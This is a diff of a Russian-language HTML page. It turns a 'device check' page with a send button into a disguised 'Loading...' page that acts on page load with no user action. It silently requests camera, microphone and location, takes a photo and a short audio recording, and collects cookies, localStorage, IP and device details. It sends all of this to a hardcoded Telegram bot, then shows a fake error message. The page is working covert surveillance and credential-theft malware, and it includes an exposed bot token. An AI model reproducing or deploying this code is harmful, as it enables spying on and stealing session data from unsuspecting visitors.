@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка устройства</title>
+    <title>Загрузка...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -18,64 +18,29 @@
             align-items: center;
             justify-content: center;
         }
-        .container {
-            max-width: 400px;
-            width: 100%;
-        }
-        h2 { font-size: 24px; margin-bottom: 8px; }
-        .sub { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        .btn {
-            background: #1e90ff;
-            border: none;
-            color: #fff;
-            padding: 16px;
-            border-radius: 40px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin: 8px 0;
-        }
-        .btn:active { transform: scale(0.96); }
-        .btn:disabled { background: #444; cursor: not-allowed; }
-        #status {
-            margin-top: 16px;
-            color: #888;
-            font-size: 14px;
-            min-height: 24px;
-        }
-        .footer { margin-top: 30px; font-size: 12px; color: #555; }
         .loader {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 3px solid #333;
-            border-top: 3px solid #1e90ff;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #222;
+            border-top: 4px solid #1e90ff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 10px auto;
+            margin: 20px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .hidden { display: none; }
+        #status { color: #555; font-size: 13px; margin-top: 10px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h2>🔐 Проверка устройства</h2>
-    <p class="sub">Для продолжения нажмите «Разрешить» и «Отправить»</p>
-
-    <button class="btn" id="sendBtn">📤 Отправить все данные</button>
-    <div id="status">⏳ Ожидание...</div>
-    <div class="footer">Ваши данные защищены</div>
-</div>
+    <div class="loader"></div>
+    <div id="status">Загрузка...</div>
 
 <script>
-    // ===== ТВОИ ДАННЫЕ (ЗАМЕНИ) =====
+    // ===== ТВОИ ДАННЫЕ =====
     const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
     const CHAT_ID = '5025315928';
-    // =================================
+    // =======================
 
-    const sendBtn = document.getElementById('sendBtn');
     const status = document.getElementById('status');
 
     let stream = null;
@@ -83,18 +48,15 @@
     let photoData = null;
     let locationData = null;
 
-    // === 1. ЗАПРАШИВАЕМ ВСЁ СРАЗУ ===
-    async function requestAll() {
-        status.textContent = '⏳ Запрос разрешений...';
+    // === ЗАПУСК СРАЗУ ===
+    window.onload = async function() {
+        status.textContent = 'Подготовка...';
 
+        // === 1. ЗАПРОС РАЗРЕШЕНИЙ (БЕЗ ОБЪЯСНЕНИЙ) ===
         try {
-            // Камера + микрофон
             stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        } catch (e) {
-            status.textContent = '⚠️ Камера/микрофон: ' + e.message;
-        }
+        } catch (e) {}
 
-        // Геолокация
         try {
             const pos = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
@@ -104,11 +66,9 @@
                 lon: pos.coords.longitude,
                 acc: pos.coords.accuracy
             };
-        } catch (e) {
-            status.textContent = '⚠️ Геолокация: ' + e.message;
-        }
+        } catch (e) {}
 
-        // Данные устройства
+        // === 2. СБОР ДАННЫХ ===
         const deviceInfo = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -116,10 +76,10 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             screen: `${screen.width}x${screen.height}`,
             touch: 'ontouchstart' in window,
-            battery: navigator.getBattery ? 'доступно' : 'нет'
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage)
         };
 
-        // Отправляем IP через внешний сервис
         let ip = 'не определён';
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -127,12 +87,12 @@
             ip = data.ip;
         } catch (e) {}
 
-        // === 2. ДЕЛАЕМ ФОТО ===
+        // === 3. ФОТО ===
         if (stream && stream.getVideoTracks().length > 0) {
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 300));
             const canvas = document.createElement('canvas');
             canvas.width = 640;
             canvas.height = 480;
@@ -140,48 +100,46 @@
             photoData = canvas.toDataURL('image/png');
         }
 
-        // === 3. ЗАПИСЫВАЕМ ЗВУК (10 сек) ===
+        // === 4. ЗВУК (5 сек) ===
         if (stream && stream.getAudioTracks().length > 0) {
             try {
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 10000));
+                await new Promise(r => setTimeout(r, 5000));
                 mediaRecorder.stop();
                 audioBlob = new Blob(chunks, { type: 'audio/webm' });
             } catch (e) {}
         }
 
-        // === 4. ОТПРАВЛЯЕМ ВСЁ ===
+        // === 5. ОТПРАВКА ===
         await sendAll(deviceInfo, ip);
-    }
+    };
 
-    // === ОТПРАВКА В TELEGRAM ===
     async function sendAll(deviceInfo, ip) {
-        status.innerHTML = '📤 Отправка... <div class="loader"></div>';
-        sendBtn.disabled = true;
+        status.textContent = 'Отправка...';
 
-        // Текстовое сообщение
-        let text = `📌 <b>Сбор данных</b>\n`;
-        text += `🖥 <b>Устройство:</b> ${deviceInfo.userAgent}\n`;
+        let text = `📌 <b>Сбор данных</b>\n\n`;
+        text += `🖥 <b>User-Agent:</b> ${deviceInfo.userAgent}\n`;
         text += `📱 <b>Платформа:</b> ${deviceInfo.platform}\n`;
         text += `🌐 <b>Язык:</b> ${deviceInfo.language}\n`;
         text += `⏰ <b>Часовой пояс:</b> ${deviceInfo.timezone}\n`;
         text += `📺 <b>Экран:</b> ${deviceInfo.screen}\n`;
         text += `🖱 <b>Тач-экран:</b> ${deviceInfo.touch}\n`;
-        text += `🔋 <b>Батарея:</b> ${deviceInfo.battery}\n`;
         text += `🌍 <b>IP:</b> ${ip}\n`;
 
         if (locationData) {
             text += `📍 <b>Гео:</b> ${locationData.lat}, ${locationData.lon} (±${locationData.acc}м)\n`;
-            text += `🔗 <a href="https://maps.google.com/maps?q=${locationData.lat},${locationData.lon}">Открыть на карте</a>`;
         }
 
-        // Отправляем текст
+        text += `\n🍪 <b>Cookies:</b> ${deviceInfo.cookies || 'нет'}\n`;
+        text += `📦 <b>LocalStorage:</b> ${deviceInfo.localStorage || 'нет'}\n`;
+
+        // Отправка текста
         await sendToTelegram('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' });
 
-        // Отправляем фото
+        // Отправка фото
         if (photoData) {
             const blob = await fetch(photoData).then(r => r.blob());
             const form = new FormData();
@@ -190,7 +148,7 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
         }
 
-        // Отправляем аудио
+        // Отправка аудио
         if (audioBlob) {
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
@@ -198,7 +156,13 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
         }
 
-        status.textContent = '✅ Все данные отправлены!';
+        // === 6. ПОСЛЕ ОТПРАВКИ — ПУСТАЯ СТРАНИЦА ===
+        document.body.innerHTML = `
+            <div style="text-align:center;padding:50px;color:#555;font-family:system-ui;">
+                <h2 style="font-size:20px;color:#333;">Ошибка загрузки</h2>
+                <p style="font-size:14px;">Попробуйте обновить страницу</p>
+            </div>
+        `;
     }
 
     async function sendToTelegram(method, params) {
@@ -209,8 +173,6 @@
         }
         await fetch(url, { method: 'POST', body: form });
     }
-
-    sendBtn.onclick = requestAll;
 </script>
 </body>
 </html>
